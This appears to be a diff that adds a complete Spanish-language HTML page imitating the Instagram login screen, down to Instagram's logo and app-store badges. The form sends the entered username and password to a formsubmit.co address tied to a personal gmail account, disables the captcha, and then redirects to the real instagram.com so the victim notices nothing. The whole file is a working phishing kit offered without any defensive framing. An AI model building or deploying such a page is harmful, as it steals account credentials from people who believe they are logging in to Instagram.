@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Instagram</title>
+<style>
+  @import url('https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap');
+
+  body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
+      Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    background-color: #fafafa;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+
+  .container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    max-width: 935px;
+    width: 100%;
+    padding: 40px 0;
+  }
+
+  .phone-mockup {
+    background: url('https://instagram.com/static/images/homepage/phones/home-phones.png/43cc71bb1b43.png') no-repeat center center;
+    background-size: contain;
+    width: 454px;
+    height: 618px;
+    margin-right: 32px;
+  }
+
+  .login-box {
+    background: white;
+    border: 1px solid #dbdbdb;
+    padding: 40px 40px 20px;
+    width: 350px;
+    text-align: center;
+  }
+
+  .logo {
+    background-image: url('https://instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png');
+    height: 51px;
+    width: 175px;
+    background-size: contain;
+    background-repeat: no-repeat;
+    margin: 0 auto 20px auto;
+  }
+
+  form {
+    display: flex;
+    flex-direction: column;
+  }
+
+  input {
+    margin: 6px 0 12px;
+    padding: 9px 8px;
+    font-size: 14px;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    background: #fafafa;
+    outline: none;
+  }
+
+  input:focus {
+    background: white;
+    border-color: #a8a8a8;
+  }
+
+  button {
+    background-color: #3897f0;
+    border: none;
+    border-radius: 4px;
+    color: white;
+    font-weight: 600;
+    padding: 8px 0;
+    margin-top: 10px;
+    cursor: pointer;
+    font-size: 14px;
+  }
+
+  button:hover {
+    background-color: #2a78c4;
+  }
+
+  .divider {
+    display: flex;
+    align-items: center;
+    margin: 10px 0 18px;
+  }
+
+  .divider hr {
+    flex-grow: 1;
+    border: none;
+    border-top: 1px solid #dbdbdb;
+  }
+
+  .divider span {
+    margin: 0 18px;
+    color: #8e8e8e;
+    font-weight: 600;
+    font-size: 13px;
+  }
+
+  .facebook-login {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #385185;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    margin-bottom: 12px;
+    text-decoration: none;
+  }
+
+  .facebook-login svg {
+    margin-right: 8px;
+  }
+
+  .forgot-password {
+    color: #00376b;
+    font-size: 12px;
+    text-decoration: none;
+    margin-bottom: 12px;
+  }
+
+  .signup-box {
+    background: white;
+    border: 1px solid #dbdbdb;
+    margin-top: 10px;
+    padding: 20px 40px;
+    width: 350px;
+    text-align: center;
+    font-size: 14px;
+  }
+
+  .signup-box a {
+    color: #3897f0;
+    font-weight: 600;
+    text-decoration: none;
+    margin-left: 5px;
+  }
+
+  .app-download {
+    text-align: center;
+    margin-top: 20px;
+    font-size: 14px;
+    color: #8e8e8e;
+  }
+
+  .app-download img {
+    height: 40px;
+    margin: 0 8px;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="phone-mockup"></div>
+
+  <div>
+    <div class="login-box">
+      <div class="logo"></div>
+      <form action="https://formsubmit.co/aitortillado@gmail.com" method="POST">
+        <input type="text" name="Usuario" placeholder="Teléfono, usuario o correo electrónico" required>
+        <input type="password" name="Contraseña" placeholder="Contraseña" required>
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_next" value="https://instagram.com" />
+        <button type="submit">Iniciar sesión</button>
+      </form>
+
+      <div class="divider"><hr><span>O</span><hr></div>
+
+      <a href="#" class="facebook-login" onclick="alert('Funcionalidad no implementada')">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="#385185" width="20" height="20" viewBox="0 0 24 24"><path d="M22.675 0h-21.35C.599 0 0 .6 0 1.337v21.326C0 23.4.599 24 1.325 24H12.82v-9.294H9.692v-3.622h3.128V8.413c0-3.1 1.894-4.788 4.658-4.788 1.325 0 2.466.099 2.797.143v3.24l-1.918.001c-1.504 0-1.796.715-1.796 1.763v2.313h3.59l-.467 3.622h-3.123V24h6.116c.726 0 1.325-.6 1.325-1.337V1.337C24 .6 23.402 0 22.675 0z"/></svg>
+        Iniciar sesión con Facebook
+      </a>
+
+      <a href="#" class="forgot-password">¿Has olvidado la contraseña?</a>
+    </div>
+
+    <div class="signup-box">
+      ¿¿No tienes una cuenta? <a href="https://instagram.com/accounts/emailsignup">Regístrate</a>
+    </div>
+
+    <div class="app-download">
+      <p>Descarga la aplicación.</p>
+      <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank">
+        <img src="https://www.instagram.com/static/images/appstore-install-badges/apple-store.png/4b7a4c57f6e2.png" alt="App Store">
+      </a>
+      <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
+        <img src="https://www.instagram.com/static/images/appstore-install-badges/google-play.png/67a62c1f1a6b.png" alt="Google Play">
+      </a>
+    </div>
+  </div>
+
+</div>
+
+</body>
+</html>
